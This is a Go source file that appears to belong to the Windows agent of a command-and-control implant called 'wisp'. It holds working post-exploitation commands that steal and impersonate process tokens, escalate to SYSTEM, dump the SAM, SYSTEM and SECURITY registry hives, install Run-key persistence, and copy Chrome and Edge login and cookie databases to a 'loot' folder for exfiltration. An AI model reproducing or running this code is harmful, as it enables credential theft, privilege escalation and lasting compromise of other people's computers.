//go:build windows

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// execTokenStealCmd duplicates a remote process's token and impersonates it on
// the current thread. args: {"pid":<pid>}
func (d *Dispatcher) execTokenStealCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		Pid uint32 `json:"pid"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	if args.Pid == 0 {
		return d.finish(task, "error: pid is required", "failed")
	}
	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, args.Pid)
	if err != nil {
		return d.finish(task, "OpenProcess failed: "+err.Error(), "failed")
	}
	defer windows.CloseHandle(proc)

	var token windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &token); err != nil {
		return d.finish(task, "OpenProcessToken failed: "+err.Error(), "failed")
	}
	defer token.Close()

	var dup windows.Token
	if err := windows.DuplicateTokenEx(token, windows.TOKEN_IMPERSONATE|windows.TOKEN_QUERY, nil,
		windows.SecurityImpersonation, windows.TokenImpersonation, &dup); err != nil {
		return d.finish(task, "DuplicateTokenEx failed: "+err.Error(), "failed")
	}
	defer dup.Close()

	if err := windows.SetThreadToken(nil, dup); err != nil {
		return d.finish(task, "SetThreadToken failed: "+err.Error(), "failed")
	}
	return d.finish(task, fmt.Sprintf("token stolen from PID %d and impersonated on this thread", args.Pid), "")
}

// execTokenRevertCmd drops the impersonated token back to the process token.
func (d *Dispatcher) execTokenRevertCmd(_ *Dispatcher, task *Task) *Result {
	if err := windows.RevertToSelf(); err != nil {
		return d.finish(task, "RevertToSelf failed: "+err.Error(), "failed")
	}
	return d.finish(task, "reverted to process token", "")
}

// enableDebugPrivilege enables SeDebugPrivilege on the current process token.
func enableDebugPrivilege() error {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token); err != nil {
		return err
	}
	defer token.Close()
	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid); err != nil {
		return err
	}
	privs := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	return windows.AdjustTokenPrivileges(token, false, &privs, 0, nil, nil)
}

// execGetSystemCmd impersonates the SYSTEM token (classic PID 4 technique).
func (d *Dispatcher) execGetSystemCmd(_ *Dispatcher, task *Task) *Result {
	if err := enableDebugPrivilege(); err != nil {
		return d.finish(task, "enable SeDebugPrivilege failed: "+err.Error(), "failed")
	}
	// The System process always has PID 4 on Windows NT+.
	proc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, 4)
	if err != nil {
		return d.finish(task, "OpenProcess(System) failed: "+err.Error(), "failed")
	}
	defer windows.CloseHandle(proc)
	var token windows.Token
	if err := windows.OpenProcessToken(proc, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &token); err != nil {
		return d.finish(task, "OpenProcessToken(System) failed: "+err.Error(), "failed")
	}
	defer token.Close()
	var dup windows.Token
	if err := windows.DuplicateTokenEx(token, windows.TOKEN_IMPERSONATE|windows.TOKEN_QUERY, nil,
		windows.SecurityImpersonation, windows.TokenImpersonation, &dup); err != nil {
		return d.finish(task, "DuplicateTokenEx failed: "+err.Error(), "failed")
	}
	defer dup.Close()
	if err := windows.SetThreadToken(nil, dup); err != nil {
		return d.finish(task, "SetThreadToken failed: "+err.Error(), "failed")
	}
	return d.finish(task, "impersonating SYSTEM", "")
}

// execHashdumpCmd exports the SAM + SYSTEM hives to the agent directory (the
// classic reg save approach; requires admin / SYSTEM).
func (d *Dispatcher) execHashdumpCmd(_ *Dispatcher, task *Task) *Result {
	out := "hashdump (reg save)\n"
	for _, hive := range []struct {
		key  string
		name string
	}{
		{`HKLM\SAM`, "SAM"},
		{`HKLM\SYSTEM`, "SYSTEM"},
		{`HKLM\SECURITY`, "SECURITY"},
	} {
		dst := filepath.Join(os.TempDir(), "wisp_"+hive.name+".hive")
		args := []string{"/c", "reg", "save", hive.key, dst, "/y"}
		_, _ = runShellCommand(context.Background(), strings.Join(args, " "))
		if fi, err := os.Stat(dst); err == nil && fi.Size() > 0 {
			out += fmt.Sprintf("%s saved to %s (%d bytes)\n", hive.name, dst, fi.Size())
		} else {
			out += hive.name + ": save failed (need admin?)\n"
		}
	}
	return d.finish(task, strings.TrimSpace(out), "")
}

// execPersistCmd installs a HKCU Run registry persistence pointing at the
// agent executable. args: {"name":"<value name>","command":"<cmd>","delete":bool}
func (d *Dispatcher) execPersistCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		Name    string `json:"name"`
		Command string `json:"command"`
		Delete  bool   `json:"delete"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	if args.Name == "" {
		args.Name = "wisp"
	}
	if args.Command == "" {
		self, err := os.Executable()
		if err != nil {
			return d.finish(task, "error: cannot locate agent: "+err.Error(), "failed")
		}
		args.Command = `"` + self + `"`
	}
	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		var created bool
		key, created, err = registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
		_ = created
	}
	if err != nil {
		return d.finish(task, "open Run key failed: "+err.Error(), "failed")
	}
	defer key.Close()
	if args.Delete {
		if err := key.DeleteValue(args.Name); err != nil {
			return d.finish(task, "delete failed: "+err.Error(), "failed")
		}
		return d.finish(task, "persistence removed: "+args.Name, "")
	}
	if err := key.SetStringValue(args.Name, args.Command); err != nil {
		return d.finish(task, "set value failed: "+err.Error(), "failed")
	}
	return d.finish(task, fmt.Sprintf("persistence installed: %s = %s", args.Name, args.Command), "")
}

// execBrowserCredsCmd locates Chrome/Edge/Firefox credential stores and copies
// them to a staging directory for exfiltration. args: {"out":"<dir>"}
func (d *Dispatcher) execBrowserCredsCmd(_ *Dispatcher, task *Task) *Result {
	var args struct {
		Out string `json:"out"`
	}
	_ = json.Unmarshal([]byte(task.Args), &args)
	stage := args.Out
	if stage == "" {
		stage = filepath.Join(os.TempDir(), "wisp_loot")
	}
	_ = os.MkdirAll(stage, 0700)

	local := os.Getenv("LOCALAPPDATA")
	if local == "" {
		return d.finish(task, "error: LOCALAPPDATA not set", "failed")
	}
	candidates := []string{
		filepath.Join(local, "Google", "Chrome", "User Data", "Default", "Login Data"),
		filepath.Join(local, "Google", "Chrome", "User Data", "Default", "Cookies"),
		filepath.Join(local, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
		filepath.Join(local, "Microsoft", "Edge", "User Data", "Default", "Cookies"),
	}
	var out []string
	for _, src := range candidates {
		if fi, err := os.Stat(src); err == nil && fi.Size() > 0 {
			dst := filepath.Join(stage, filepath.Base(src))
			if copyFile(src, dst) == nil {
				out = append(out, fmt.Sprintf("%s (%d bytes)", dst, fi.Size()))
			}
		}
	}
	if len(out) == 0 {
		return d.finish(task, "no browser credential stores found", "")
	}
	return d.finish(task, "browser stores staged:\n"+strings.Join(out, "\n"), "")
}

// copyFile copies src to dst, handling the SQLite lock Chrome holds by copying
// (the DB may be mid-write; we copy what's readable).
func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0600)
}
